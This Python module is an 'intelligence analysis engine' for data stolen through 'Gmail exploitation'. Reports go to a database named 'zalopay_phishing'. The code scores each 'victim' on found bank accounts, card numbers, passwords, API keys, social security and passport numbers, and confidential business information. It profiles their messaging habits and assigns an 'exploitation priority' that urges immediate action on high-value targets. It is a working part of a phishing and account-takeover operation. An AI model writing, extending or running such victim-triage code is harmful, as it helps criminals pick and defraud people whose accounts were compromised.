"""
Intelligence Analysis Engine
Analyze and correlate intelligence from Gmail exploitation
"""

import os
import json
import re
import time
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple, Set
from collections import defaultdict, Counter
import logging
import threading

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class IntelligenceAnalysisConfig:
    """Intelligence analysis configuration"""

    def __init__(self):
        self.max_analysis_time = int(os.getenv("MAX_ANALYSIS_TIME", "300"))
        self.enable_pattern_recognition = os.getenv("ENABLE_PATTERN_RECOGNITION", "true").lower() == "true"
        self.enable_anomaly_detection = os.getenv("ENABLE_ANOMALY_DETECTION", "true").lower() == "true"
        self.enable_correlation_analysis = os.getenv("ENABLE_CORRELATION_ANALYSIS", "true").lower() == "true"
        self.confidence_threshold = float(os.getenv("CONFIDENCE_THRESHOLD", "0.7"))
        self.max_correlation_distance = int(os.getenv("MAX_CORRELATION_DISTANCE", "7"))  # days

class IntelligenceReport:
    """Intelligence analysis report"""

    def __init__(self, victim_id: str):
        self.victim_id = victim_id
        self.generated_at = datetime.now(timezone.utc)

        # Overall assessment
        self.risk_level = "unknown"
        self.threat_score = 0.0
        self.intelligence_value = 0.0
        self.exploitation_priority = "low"

        # Intelligence categories
        self.financial_intelligence = {
            "accounts_found": 0,
            "transactions_found": 0,
            "total_value": 0.0,
            "risk_score": 0.0,
            "key_findings": []
        }

        self.personal_intelligence = {
            "personal_data_found": 0,
            "sensitive_info_found": 0,
            "identity_documents": [],
            "risk_score": 0.0,
            "key_findings": []
        }

        self.business_intelligence = {
            "company_info_found": 0,
            "business_contacts": 0,
            "strategic_info": [],
            "competitive_advantage": 0.0,
            "key_findings": []
        }

        self.technical_intelligence = {
            "credentials_found": 0,
            "api_keys_found": 0,
            "system_access": [],
            "technical_assets": [],
            "risk_score": 0.0,
            "key_findings": []
        }

        # Behavioral analysis
        self.behavioral_profile = {
            "communication_patterns": {},
            "activity_patterns": {},
            "sentiment_trends": {},
            "anomalies_detected": []
        }

        # Network analysis
        self.network_analysis = {
            "contact_network_size": 0,
            "influence_network": {},
            "communication_clusters": [],
            "key_relationships": []
        }

        # Timeline analysis
        self.timeline_events = []
        self.activity_timeline = {}

        # Recommendations
        self.recommendations = []
        self.next_steps = []

    def calculate_overall_scores(self):
        """Calculate overall intelligence scores"""
        try:
            # Threat score based on intelligence categories
            category_scores = [
                self.financial_intelligence["risk_score"],
                self.personal_intelligence["risk_score"],
                self.technical_intelligence["risk_score"]
            ]

            self.threat_score = sum(category_scores) / len(category_scores) if category_scores else 0.0

            # Intelligence value based on data richness
            value_factors = [
                self.financial_intelligence["accounts_found"] * 0.3,
                self.personal_intelligence["sensitive_info_found"] * 0.25,
                self.business_intelligence["company_info_found"] * 0.2,
                self.technical_intelligence["credentials_found"] * 0.15,
                len(self.network_analysis["key_relationships"]) * 0.1
            ]

            self.intelligence_value = min(1.0, sum(value_factors))

            # Determine risk level
            if self.threat_score >= 0.8:
                self.risk_level = "critical"
            elif self.threat_score >= 0.6:
                self.risk_level = "high"
            elif self.threat_score >= 0.4:
                self.risk_level = "medium"
            elif self.threat_score >= 0.2:
                self.risk_level = "low"
            else:
                self.risk_level = "minimal"

            # Determine exploitation priority
            if self.intelligence_value >= 0.8 and self.threat_score >= 0.6:
                self.exploitation_priority = "critical"
            elif self.intelligence_value >= 0.6 or self.threat_score >= 0.5:
                self.exploitation_priority = "high"
            elif self.intelligence_value >= 0.4 or self.threat_score >= 0.3:
                self.exploitation_priority = "medium"
            else:
                self.exploitation_priority = "low"

        except Exception as e:
            logger.error(f"Error calculating overall scores: {e}")

    def add_timeline_event(self, timestamp: datetime, event_type: str, description: str, severity: str = "medium"):
        """Add timeline event"""
        self.timeline_events.append({
            "timestamp": timestamp.isoformat(),
            "event_type": event_type,
            "description": description,
            "severity": severity
        })

    def add_recommendation(self, recommendation_type: str, description: str, priority: str = "medium"):
        """Add recommendation"""
        self.recommendations.append({
            "type": recommendation_type,
            "description": description,
            "priority": priority,
            "added_at": datetime.now(timezone.utc).isoformat()
        })

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "victim_id": self.victim_id,
            "generated_at": self.generated_at.isoformat(),
            "risk_level": self.risk_level,
            "threat_score": self.threat_score,
            "intelligence_value": self.intelligence_value,
            "exploitation_priority": self.exploitation_priority,
            "financial_intelligence": self.financial_intelligence,
            "personal_intelligence": self.personal_intelligence,
            "business_intelligence": self.business_intelligence,
            "technical_intelligence": self.technical_intelligence,
            "behavioral_profile": self.behavioral_profile,
            "network_analysis": self.network_analysis,
            "timeline_events": self.timeline_events,
            "activity_timeline": self.activity_timeline,
            "recommendations": self.recommendations,
            "next_steps": self.next_steps
        }

class FinancialIntelligenceAnalyzer:
    """Financial intelligence analysis"""

    def __init__(self):
        self.financial_keywords = self._load_financial_keywords()

    def _load_financial_keywords(self) -> Dict[str, List[str]]:
        """Load financial keywords"""
        return {
            "banking": ["bank", "checking", "savings", "account", "routing", "swift"],
            "credit": ["credit", "card", "visa", "mastercard", "amex", "discover"],
            "investment": ["investment", "portfolio", "stock", "bond", "mutual fund", "401k"],
            "transaction": ["transaction", "payment", "transfer", "deposit", "withdrawal"],
            "billing": ["invoice", "bill", "receipt", "payment due", "overdue"]
        }

    def analyze_financial_data(self, extracted_intelligence: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze financial intelligence"""
        try:
            analysis = {
                "accounts_found": 0,
                "transactions_found": 0,
                "total_value": 0.0,
                "risk_score": 0.0,
                "key_findings": [],
                "account_types": Counter(),
                "institutions": Counter()
            }

            for intelligence in extracted_intelligence:
                financial_data = intelligence.get("financial_data", {})

                # Count accounts
                for data_type, items in financial_data.items():
                    if data_type in ["bank_accounts", "credit_cards"]:
                        analysis["accounts_found"] += len(items)

                        for item in items:
                            value = item.get("value", "")
                            confidence = item.get("confidence", 0.0)

                            # Extract institution information
                            institution = self._extract_financial_institution(value)
                            if institution:
                                analysis["institutions"][institution] += 1

                            # Add key finding
                            if confidence >= 0.8:
                                analysis["key_findings"].append({
                                    "type": data_type,
                                    "value": value,
                                    "confidence": confidence,
                                    "category": "high_confidence_financial"
                                })

                    elif data_type in ["transactions", "invoices", "receipts"]:
                        analysis["transactions_found"] += len(items)

                        for item in items:
                            # Estimate transaction value
                            estimated_value = self._estimate_transaction_value(item.get("value", ""))
                            analysis["total_value"] += estimated_value

            # Calculate risk score
            analysis["risk_score"] = self._calculate_financial_risk(analysis)

            return analysis

        except Exception as e:
            logger.error(f"Error analyzing financial data: {e}")
            return {
                "accounts_found": 0,
                "transactions_found": 0,
                "total_value": 0.0,
                "risk_score": 0.0,
                "key_findings": []
            }

    def _extract_financial_institution(self, value: str) -> Optional[str]:
        """Extract financial institution from value"""
        try:
            # Common bank patterns
            bank_patterns = [
                (r'bank of america', 'Bank of America'),
                (r'chase bank', 'Chase Bank'),
                (r'wells fargo', 'Wells Fargo'),
                (r'citibank', 'Citibank'),
                (r'hsbc', 'HSBC'),
                (r'barclays', 'Barclays'),
                (r'goldman sachs', 'Goldman Sachs')
            ]

            value_lower = value.lower()
            for pattern, institution in bank_patterns:
                if pattern in value_lower:
                    return institution

            return None

        except Exception:
            return None

    def _estimate_transaction_value(self, value: str) -> float:
        """Estimate transaction value"""
        try:
            # Extract dollar amounts
            amount_pattern = r'\$\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)'
            match = re.search(amount_pattern, value, re.IGNORECASE)

            if match:
                amount_str = match.group(1).replace(',', '')
                return float(amount_str)

            return 0.0

        except Exception:
            return 0.0

    def _calculate_financial_risk(self, analysis: Dict[str, Any]) -> float:
        """Calculate financial risk score"""
        try:
            risk_score = 0.0

            # Risk based on number of accounts
            accounts_risk = min(analysis["accounts_found"] / 5.0, 1.0) * 0.4
            risk_score += accounts_risk

            # Risk based on transaction volume
            if analysis["total_value"] > 10000:
                value_risk = min(analysis["total_value"] / 100000.0, 1.0) * 0.3
                risk_score += value_risk

            # Risk based on high-confidence findings
            high_confidence_findings = len([
                finding for finding in analysis["key_findings"]
                if finding["confidence"] >= 0.9
            ])
            confidence_risk = min(high_confidence_findings / 3.0, 1.0) * 0.3
            risk_score += confidence_risk

            return min(1.0, risk_score)

        except Exception as e:
            logger.error(f"Error calculating financial risk: {e}")
            return 0.0

class BehavioralAnalyzer:
    """Behavioral pattern analysis"""

    def __init__(self):
        self.activity_patterns = self._load_activity_patterns()

    def _load_activity_patterns(self) -> Dict[str, Dict[str, Any]]:
        """Load activity pattern definitions"""
        return {
            "communication_volume": {
                "thresholds": {"low": 5, "medium": 20, "high": 50},
                "weight": 0.2
            },
            "response_times": {
                "thresholds": {"fast": 3600, "medium": 86400, "slow": 604800},  # seconds
                "weight": 0.3
            },
            "active_hours": {
                "business_hours": [9, 10, 11, 14, 15, 16],  # 24-hour format
                "weight": 0.2
            },
            "topic_diversity": {
                "thresholds": {"low": 3, "medium": 8, "high": 15},
                "weight": 0.3
            }
        }

    def analyze_behavioral_patterns(self, messages: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze behavioral patterns from messages"""
        try:
            analysis = {
                "communication_patterns": {},
                "activity_patterns": {},
                "sentiment_trends": {},
                "anomalies_detected": []
            }

            if not messages:
                return analysis

            # Analyze communication volume
            daily_volume = self._analyze_communication_volume(messages)
            analysis["communication_patterns"]["daily_volume"] = daily_volume

            # Analyze response times
            response_times = self._analyze_response_times(messages)
            analysis["communication_patterns"]["response_times"] = response_times

            # Analyze active hours
            active_hours = self._analyze_active_hours(messages)
            analysis["activity_patterns"]["active_hours"] = active_hours

            # Analyze sentiment trends
            sentiment_trends = self._analyze_sentiment_trends(messages)
            analysis["sentiment_trends"] = sentiment_trends

            # Detect anomalies
            anomalies = self._detect_anomalies(messages, analysis)
            analysis["anomalies_detected"] = anomalies

            return analysis

        except Exception as e:
            logger.error(f"Error analyzing behavioral patterns: {e}")
            return {
                "communication_patterns": {},
                "activity_patterns": {},
                "sentiment_trends": {},
                "anomalies_detected": []
            }

    def _analyze_communication_volume(self, messages: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze communication volume patterns"""
        try:
            # Group messages by day
            daily_counts = Counter()

            for message in messages:
                headers = message.get("headers", {})
                if "date" in headers:
                    try:
                        date_str = headers["date"]
                        date_obj = datetime.strptime(date_str, "%a, %d %b %Y %H:%M:%S %z")
                        day_key = date_obj.date().isoformat()
                        daily_counts[day_key] += 1
                    except Exception:
                        continue

            # Calculate statistics
            if daily_counts:
                volumes = list(daily_counts.values())
                return {
                    "avg_daily_messages": sum(volumes) / len(volumes),
                    "max_daily_messages": max(volumes),
                    "total_days": len(volumes),
                    "communication_frequency": self._categorize_volume(sum(volumes) / len(volumes))
                }

            return {"avg_daily_messages": 0, "max_daily_messages": 0, "total_days": 0}

        except Exception as e:
            logger.error(f"Error analyzing communication volume: {e}")
            return {}

    def _analyze_response_times(self, messages: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze response time patterns"""
        try:
            # This is a simplified analysis - in reality, would need thread analysis
            response_times = []

            # For now, estimate based on message timestamps
            sorted_messages = sorted(messages, key=lambda x: x.get("internal_date", 0))

            for i in range(1, len(sorted_messages)):
                current_time = sorted_messages[i].get("internal_date", 0)
                previous_time = sorted_messages[i-1].get("internal_date", 0)

                if current_time and previous_time:
                    time_diff = (current_time - previous_time) / 1000  # Convert to seconds
                    response_times.append(time_diff)

            if response_times:
                avg_response_time = sum(response_times) / len(response_times)
                return {
                    "avg_response_time_seconds": avg_response_time,
                    "response_time_category": self._categorize_response_time(avg_response_time),
                    "total_analyzed": len(response_times)
                }

            return {"avg_response_time_seconds": 0, "response_time_category": "unknown"}

        except Exception as e:
            logger.error(f"Error analyzing response times: {e}")
            return {}

    def _analyze_active_hours(self, messages: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze active hours patterns"""
        try:
            hourly_activity = Counter()

            for message in messages:
                headers = message.get("headers", {})
                if "date" in headers:
                    try:
                        date_str = headers["date"]
                        date_obj = datetime.strptime(date_str, "%a, %d %b %Y %H:%M:%S %z")
                        hour = date_obj.hour
                        hourly_activity[hour] += 1
                    except Exception:
                        continue

            if hourly_activity:
                most_active_hour = max(hourly_activity.keys(), key=lambda h: hourly_activity[h])
                business_hours_ratio = sum(
                    hourly_activity.get(hour, 0) for hour in [9, 10, 11, 14, 15, 16]
                ) / sum(hourly_activity.values())

                return {
                    "most_active_hour": most_active_hour,
                    "business_hours_ratio": business_hours_ratio,
                    "hourly_distribution": dict(hourly_activity),
                    "activity_type": "business" if business_hours_ratio > 0.6 else "personal"
                }

            return {"most_active_hour": 0, "business_hours_ratio": 0.0}

        except Exception as e:
            logger.error(f"Error analyzing active hours: {e}")
            return {}

    def _analyze_sentiment_trends(self, messages: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze sentiment trends"""
        try:
            # Simplified sentiment analysis
            positive_words = ["great", "excellent", "good", "thanks", "perfect", "awesome"]
            negative_words = ["terrible", "bad", "awful", "hate", "worst", "angry", "frustrated"]

            sentiment_scores = []

            for message in messages:
                text_content = self._extract_message_text(message)
                text_lower = text_content.lower()

                positive_count = sum(1 for word in positive_words if word in text_lower)
                negative_count = sum(1 for word in negative_words if word in text_lower)

                if positive_count + negative_count > 0:
                    sentiment_score = (positive_count - negative_count) / (positive_count + negative_count)
                    sentiment_scores.append(sentiment_score)

            if sentiment_scores:
                avg_sentiment = sum(sentiment_scores) / len(sentiment_scores)
                return {
                    "avg_sentiment": avg_sentiment,
                    "sentiment_trend": "positive" if avg_sentiment > 0.1 else "negative" if avg_sentiment < -0.1 else "neutral",
                    "sentiment_volatility": self._calculate_volatility(sentiment_scores)
                }

            return {"avg_sentiment": 0.0, "sentiment_trend": "neutral"}

        except Exception as e:
            logger.error(f"Error analyzing sentiment trends: {e}")
            return {}

    def _extract_message_text(self, message: Dict[str, Any]) -> str:
        """Extract text content from message"""
        try:
            text_parts = []

            body = message.get("body", {})
            if "text" in body:
                text_parts.append(body["text"])
            if "html" in body:
                html_text = re.sub(r'<[^>]+>', ' ', body["html"])
                text_parts.append(html_text)

            if "snippet" in message:
                text_parts.append(message["snippet"])

            return " ".join(text_parts)

        except Exception:
            return ""

    def _categorize_volume(self, avg_volume: float) -> str:
        """Categorize communication volume"""
        if avg_volume >= 50:
            return "very_high"
        elif avg_volume >= 20:
            return "high"
        elif avg_volume >= 5:
            return "medium"
        else:
            return "low"

    def _categorize_response_time(self, avg_seconds: float) -> str:
        """Categorize response time"""
        if avg_seconds <= 3600:  # 1 hour
            return "fast"
        elif avg_seconds <= 86400:  # 1 day
            return "medium"
        else:
            return "slow"

    def _calculate_volatility(self, values: List[float]) -> float:
        """Calculate volatility of values"""
        try:
            if len(values) < 2:
                return 0.0

            mean = sum(values) / len(values)
            variance = sum((x - mean) ** 2 for x in values) / len(values)
            return variance ** 0.5

        except Exception:
            return 0.0

    def _detect_anomalies(self, messages: List[Dict[str, Any]], analysis: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Detect behavioral anomalies"""
        try:
            anomalies = []

            # Volume anomaly
            daily_volume = analysis["communication_patterns"].get("daily_volume", {})
            avg_volume = daily_volume.get("avg_daily_messages", 0)

            if avg_volume > 0:
                # Check for days with unusually high volume
                for day, count in daily_volume.items():
                    if isinstance(count, dict) and "daily_volume" in count:
                        continue  # Skip summary data

                    if count > avg_volume * 3:  # 3x normal volume
                        anomalies.append({
                            "type": "volume_spike",
                            "date": day,
                            "normal_volume": avg_volume,
                            "actual_volume": count,
                            "severity": "medium"
                        })

            # Time anomaly
            active_hours = analysis["activity_patterns"].get("active_hours", {})
            most_active_hour = active_hours.get("most_active_hour", 0)

            # Unusual activity hours (e.g., 3 AM activity)
            if most_active_hour in [2, 3, 4] and active_hours.get("business_hours_ratio", 0) < 0.3:
                anomalies.append({
                    "type": "unusual_hours",
                    "active_hour": most_active_hour,
                    "business_hours_ratio": active_hours.get("business_hours_ratio", 0),
                    "severity": "low"
                })

            return anomalies

        except Exception as e:
            logger.error(f"Error detecting anomalies: {e}")
            return []

class IntelligenceAnalyzer:
    """Main intelligence analysis engine"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = IntelligenceAnalysisConfig()
        self.financial_analyzer = FinancialIntelligenceAnalyzer()
        self.behavioral_analyzer = BehavioralAnalyzer()

        # Analysis cache
        self.analysis_cache: Dict[str, IntelligenceReport] = {}

    def analyze_victim_intelligence(self, victim_id: str, extracted_intelligence: List[Dict[str, Any]],
                                  messages: List[Dict[str, Any]] = None) -> IntelligenceReport:
        """
        Analyze intelligence for victim

        Args:
            victim_id: Victim identifier
            extracted_intelligence: List of extracted intelligence data
            messages: Gmail messages for behavioral analysis

        Returns:
            Intelligence analysis report
        """
        try:
            # Check cache
            cache_key = self._generate_cache_key(victim_id)
            cached_report = self._get_cached_analysis(cache_key)
            if cached_report:
                return cached_report

            # Create report
            report = IntelligenceReport(victim_id)

            # Analyze financial intelligence
            financial_analysis = self.financial_analyzer.analyze_financial_data(extracted_intelligence)
            report.financial_intelligence.update(financial_analysis)

            # Analyze personal intelligence (placeholder)
            personal_analysis = self._analyze_personal_intelligence(extracted_intelligence)
            report.personal_intelligence.update(personal_analysis)

            # Analyze business intelligence (placeholder)
            business_analysis = self._analyze_business_intelligence(extracted_intelligence)
            report.business_intelligence.update(business_analysis)

            # Analyze technical intelligence (placeholder)
            technical_analysis = self._analyze_technical_intelligence(extracted_intelligence)
            report.technical_intelligence.update(technical_analysis)

            # Analyze behavioral patterns
            if messages:
                behavioral_analysis = self.behavioral_analyzer.analyze_behavioral_patterns(messages)
                report.behavioral_profile.update(behavioral_analysis)

            # Calculate overall scores
            report.calculate_overall_scores()

            # Generate recommendations
            self._generate_recommendations(report)

            # Cache result
            self._cache_analysis(cache_key, report)

            # Store in database
            if self.mongodb:
                self._store_intelligence_report(report)

            logger.info(f"Intelligence analysis completed for victim: {victim_id}")
            return report

        except Exception as e:
            logger.error(f"Error analyzing victim intelligence: {e}")
            # Return basic report on error
            report = IntelligenceReport(victim_id)
            report.risk_level = "error"
            return report

    def _analyze_personal_intelligence(self, extracted_intelligence: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze personal intelligence"""
        try:
            analysis = {
                "personal_data_found": 0,
                "sensitive_info_found": 0,
                "identity_documents": [],
                "risk_score": 0.0,
                "key_findings": []
            }

            for intelligence in extracted_intelligence:
                personal_data = intelligence.get("personal_data", {})

                for data_type, items in personal_data.items():
                    analysis["personal_data_found"] += len(items)

                    # Count sensitive information
                    sensitive_types = ["social_security", "passport_numbers", "drivers_license"]
                    if data_type in sensitive_types:
                        analysis["sensitive_info_found"] += len(items)

                        for item in items:
                            if item.get("confidence", 0) >= 0.8:
                                analysis["key_findings"].append({
                                    "type": data_type,
                                    "value": item.get("value"),
                                    "confidence": item.get("confidence", 0),
                                    "category": "sensitive_personal"
                                })

            # Calculate risk score
            personal_risk = min(analysis["personal_data_found"] / 10.0, 1.0) * 0.3
            sensitive_risk = min(analysis["sensitive_info_found"] / 3.0, 1.0) * 0.7
            analysis["risk_score"] = personal_risk + sensitive_risk

            return analysis

        except Exception as e:
            logger.error(f"Error analyzing personal intelligence: {e}")
            return {
                "personal_data_found": 0,
                "sensitive_info_found": 0,
                "identity_documents": [],
                "risk_score": 0.0,
                "key_findings": []
            }

    def _analyze_business_intelligence(self, extracted_intelligence: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze business intelligence"""
        try:
            analysis = {
                "company_info_found": 0,
                "business_contacts": 0,
                "strategic_info": [],
                "competitive_advantage": 0.0,
                "key_findings": []
            }

            for intelligence in extracted_intelligence:
                business_data = intelligence.get("business_data", {})

                for data_type, items in business_data.items():
                    if data_type in ["company_names", "business_emails"]:
                        analysis["company_info_found"] += len(items)

                    elif data_type == "job_titles":
                        analysis["business_contacts"] += len(items)

                    # Look for strategic information
                    for item in items:
                        value = item.get("value", "")
                        confidence = item.get("confidence", 0)

                        strategic_keywords = ["strategy", "planning", "confidential", "internal", "secret"]
                        if any(keyword in value.lower() for keyword in strategic_keywords):
                            if confidence >= 0.7:
                                analysis["strategic_info"].append({
                                    "value": value,
                                    "confidence": confidence,
                                    "category": "strategic"
                                })

            # Calculate competitive advantage score
            strategic_count = len(analysis["strategic_info"])
            analysis["competitive_advantage"] = min(strategic_count / 5.0, 1.0)

            return analysis

        except Exception as e:
            logger.error(f"Error analyzing business intelligence: {e}")
            return {
                "company_info_found": 0,
                "business_contacts": 0,
                "strategic_info": [],
                "competitive_advantage": 0.0,
                "key_findings": []
            }

    def _analyze_technical_intelligence(self, extracted_intelligence: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze technical intelligence"""
        try:
            analysis = {
                "credentials_found": 0,
                "api_keys_found": 0,
                "system_access": [],
                "technical_assets": [],
                "risk_score": 0.0,
                "key_findings": []
            }

            for intelligence in extracted_intelligence:
                auth_data = intelligence.get("auth_data", {})

                for data_type, items in auth_data.items():
                    if data_type == "passwords":
                        analysis["credentials_found"] += len(items)
                    elif data_type == "api_keys":
                        analysis["api_keys_found"] += len(items)

                    # Add high-confidence findings
                    for item in items:
                        if item.get("confidence", 0) >= 0.8:
                            analysis["key_findings"].append({
                                "type": data_type,
                                "value": item.get("value"),
                                "confidence": item.get("confidence", 0),
                                "category": "technical_credential"
                            })

            # Calculate risk score
            credential_risk = min(analysis["credentials_found"] / 5.0, 1.0) * 0.6
            api_key_risk = min(analysis["api_keys_found"] / 3.0, 1.0) * 0.4
            analysis["risk_score"] = credential_risk + api_key_risk

            return analysis

        except Exception as e:
            logger.error(f"Error analyzing technical intelligence: {e}")
            return {
                "credentials_found": 0,
                "api_keys_found": 0,
                "system_access": [],
                "technical_assets": [],
                "risk_score": 0.0,
                "key_findings": []
            }

    def _generate_recommendations(self, report: IntelligenceReport):
        """Generate intelligence-based recommendations"""
        try:
            # Financial intelligence recommendations
            if report.financial_intelligence["accounts_found"] > 0:
                report.add_recommendation(
                    "financial_monitoring",
                    f"Monitor {report.financial_intelligence['accounts_found']} financial accounts for suspicious activity",
                    "high"
                )

            # Personal intelligence recommendations
            if report.personal_intelligence["sensitive_info_found"] > 0:
                report.add_recommendation(
                    "identity_protection",
                    f"Protect {report.personal_intelligence['sensitive_info_found']} sensitive personal information items",
                    "critical"
                )

            # Technical intelligence recommendations
            if report.technical_intelligence["credentials_found"] > 0:
                report.add_recommendation(
                    "credential_security",
                    f"Secure {report.technical_intelligence['credentials_found']} compromised credentials",
                    "critical"
                )

            # Business intelligence recommendations
            if report.business_intelligence["competitive_advantage"] > 0.5:
                report.add_recommendation(
                    "competitive_monitoring",
                    "Monitor for competitive intelligence exploitation",
                    "high"
                )

            # Behavioral recommendations
            anomalies = report.behavioral_profile.get("anomalies_detected", [])
            if len(anomalies) > 0:
                report.add_recommendation(
                    "behavioral_monitoring",
                    f"Monitor {len(anomalies)} detected behavioral anomalies",
                    "medium"
                )

            # Overall priority recommendations
            if report.exploitation_priority in ["critical", "high"]:
                report.add_recommendation(
                    "immediate_action",
                    f"Victim classified as {report.exploitation_priority} priority - take immediate action",
                    "critical"
                )

        except Exception as e:
            logger.error(f"Error generating recommendations: {e}")

    def _generate_cache_key(self, victim_id: str) -> str:
        """Generate cache key"""
        import hashlib
        return hashlib.sha256(victim_id.encode()).hexdigest()

    def _get_cached_analysis(self, cache_key: str) -> Optional[IntelligenceReport]:
        """Get cached analysis"""
        try:
            if cache_key in self.analysis_cache:
                return self.analysis_cache[cache_key]

            return None

        except Exception as e:
            logger.error(f"Error getting cached analysis: {e}")
            return None

    def _cache_analysis(self, cache_key: str, report: IntelligenceReport):
        """Cache analysis result"""
        try:
            self.analysis_cache[cache_key] = report

            # Limit cache size
            if len(self.analysis_cache) > 1000:
                # Remove oldest entries
                oldest_keys = sorted(self.analysis_cache.keys())[:200]
                for key in oldest_keys:
                    del self.analysis_cache[key]

        except Exception as e:
            logger.error(f"Error caching analysis: {e}")

    def _store_intelligence_report(self, report: IntelligenceReport):
        """Store intelligence report in database"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            reports_collection = db.intelligence_reports

            document = report.to_dict()
            document["expires_at"] = datetime.now(timezone.utc) + timedelta(days=30)  # Keep for 30 days

            reports_collection.replace_one(
                {"victim_id": report.victim_id},
                document,
                upsert=True
            )

        except Exception as e:
            logger.error(f"Error storing intelligence report: {e}")

    def get_intelligence_summary(self, victim_id: str) -> Dict[str, Any]:
        """Get intelligence summary for victim"""
        try:
            cache_key = self._generate_cache_key(victim_id)
            report = self.analysis_cache.get(cache_key)

            if not report:
                return {"error": "No intelligence analysis found"}

            return {
                "victim_id": victim_id,
                "risk_level": report.risk_level,
                "threat_score": report.threat_score,
                "intelligence_value": report.intelligence_value,
                "exploitation_priority": report.exploitation_priority,
                "key_findings_count": (
                    len(report.financial_intelligence["key_findings"]) +
                    len(report.personal_intelligence["key_findings"]) +
                    len(report.business_intelligence["key_findings"]) +
                    len(report.technical_intelligence["key_findings"])
                ),
                "recommendations_count": len(report.recommendations),
                "last_analyzed": report.generated_at.isoformat()
            }

        except Exception as e:
            logger.error(f"Error getting intelligence summary: {e}")
            return {"error": "Failed to get summary"}

# Global intelligence analyzer instance
intelligence_analyzer = None

def initialize_intelligence_analyzer(mongodb_connection=None, redis_client=None) -> IntelligenceAnalyzer:
    """Initialize global intelligence analyzer"""
    global intelligence_analyzer
    intelligence_analyzer = IntelligenceAnalyzer(mongodb_connection, redis_client)
    return intelligence_analyzer

def get_intelligence_analyzer() -> IntelligenceAnalyzer:
    """Get global intelligence analyzer"""
    if intelligence_analyzer is None:
        raise ValueError("Intelligence analyzer not initialized")
    return intelligence_analyzer

# Convenience functions
def analyze_victim_intelligence(victim_id: str, extracted_intelligence: List[Dict[str, Any]],
                              messages: List[Dict[str, Any]] = None) -> IntelligenceReport:
    """Analyze victim intelligence (global convenience function)"""
    return get_intelligence_analyzer().analyze_victim_intelligence(victim_id, extracted_intelligence, messages)

def get_intelligence_summary(victim_id: str) -> Dict[str, Any]:
    """Get intelligence summary (global convenience function)"""
    return get_intelligence_analyzer().get_intelligence_summary(victim_id)